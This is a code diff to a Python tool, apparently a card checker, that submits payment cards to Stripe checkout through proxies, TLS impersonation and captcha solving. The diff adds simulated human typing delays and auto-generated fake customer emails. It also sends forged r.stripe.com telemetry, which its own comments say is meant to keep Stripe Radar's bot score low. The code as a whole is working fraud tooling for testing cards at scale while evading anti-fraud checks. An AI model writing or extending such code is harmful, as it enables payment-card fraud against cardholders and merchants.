@@ -16,7 +16,8 @@ from utils.stripe import (
     get_stripe_headers, generate_stripe_fingerprints,
     generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
     get_stripe_telemetry_header, record_stripe_request,
-    get_stripe_js_version,
+    get_stripe_js_version, generate_realistic_email,
+    send_r_stripe_events,
 )
 from utils.proxy import get_proxy_url
 from utils.captcha import solve_hcaptcha
@@ -321,7 +322,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
         try:
             proxy_url = get_proxy_url(proxy_str) if proxy_str else None
             async with CurlSession(impersonate=profile) as s:
-                email = init_data.get("customer_email") or "john@example.com"
                 checksum = init_data.get("init_checksum", "")
 
                 lig = init_data.get("line_item_group")
@@ -385,20 +385,77 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 else:
                     eid = generate_eid()
 
-                # Realistic delay before confirm — mimic user typing card details
-                # First card: longer (reading page), subsequent: faster
-                if card_index == 0:
-                    await asyncio.sleep(random.uniform(2.0, 4.5))
-                else:
-                    await asyncio.sleep(random.uniform(0.8, 2.0))
+                # ━━━ Behavioral Analysis: Human-like timing simulation ━━━
+                from utils.behavioral import simulate_checkout_input, TypingSpeed
+                
+                # Determine typing speed (rotate per card untuk variasi)
+                speed_options = [TypingSpeed.SLOW, TypingSpeed.NORMAL, TypingSpeed.FAST]
+                selected_speed = speed_options[card_index % len(speed_options)]
+                
+                # Generate timing untuk input kartu
+                expiry = f"{card['month']}{card['year']}"
+                timing = simulate_checkout_input(
+                    card_number=card['cc'],
+                    expiry=expiry,
+                    cvc=card['cvv'],
+                    zip_code=zip_code if zip_code else "",
+                    speed=selected_speed
+                )
+                
+                print(f"[BEHAVIOR] Simulating human input: {timing['total_time']:.1f}s total | Profile: {timing['speed_profile']}")
+                
+                # Execute delays per field
+                breakdown = timing["breakdown"]
+                field_order = ["cc", "expiry", "cvc", "zip"]
+                
+                for field in field_order:
+                    if field not in breakdown:
+                        continue
+                    
+                    info = breakdown[field]
+                    
+                    # Input time
+                    print(f"[BEHAVIOR]   → {field}: {info['input_time']:.2f}s (simulated {info['wpm']} WPM)")
+                    await asyncio.sleep(info["input_time"])
+                    
+                    # Distraction pause (jika ada)
+                    if info.get("distraction", 0) > 0:
+                        print(f"[BEHAVIOR]   → Pause: {info['distraction']:.2f}s")
+                        await asyncio.sleep(info["distraction"])
+                    
+                    # Transition ke field berikutnya
+                    if "transition_to_next" in info:
+                        await asyncio.sleep(info["transition_to_next"])
 
                 print(f"[DEBUG] TLS Profile: {profile} | Confirming with fingerprints...")
+
+                # ━━━ Send r.stripe.com Radar telemetry before tokenize ━━━
+                # Real Stripe.js sends lifecycle events (focus/blur) to r.stripe.com/0
+                # Without this, Stripe Radar sees zero telemetry = bot score > 80
+                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                device_fp = session_ctx.get("device_fp") if session_ctx else None
+                try:
+                    await send_r_stripe_events(
+                        fp=fp,
+                        checkout_url=checkout_url,
+                        tls_profile=profile,
+                        user_agent=session_ctx.get("user_agent", "") if session_ctx else "",
+                        cookies_str=stripe_cookies,
+                        device_fp=device_fp,
+                        proxy=proxy_url,
+                        payment_user_agent=pua,
+                    )
+                except Exception as _r_err:
+                    print(f"[DEBUG] ⚠️ r.stripe.com skipped: {str(_r_err)[:40]}")
 
                 # ━━━ Step 1: Tokenize card → PaymentMethod (pm_xxx) ━━━
                 # Real browser tokenizes card in Stripe Elements iframe FIRST,
                 # then confirm only sends pm_xxx — NOT raw card data
-                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
                 
+                # Resolve email AFTER name is available
+                email = init_data.get("customer_email") or generate_realistic_email(name)
+                print(f"[DEBUG] Email: {email}")
+
                 pm_body = (
                     f"type=card"
                     f"&card[number]={card['cc']}"
@@ -427,6 +484,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     allow_redisplay = session_ctx["allow_redisplay"]
                 pm_body += f"&allow_redisplay={allow_redisplay}"
                 pm_body += f"&referrer={checkout_url}"
+
 
                 # Use curl_cffi headers + matched UA + sec-ch-ua + cookies
                 ua = session_ctx.get("user_agent") if session_ctx else None
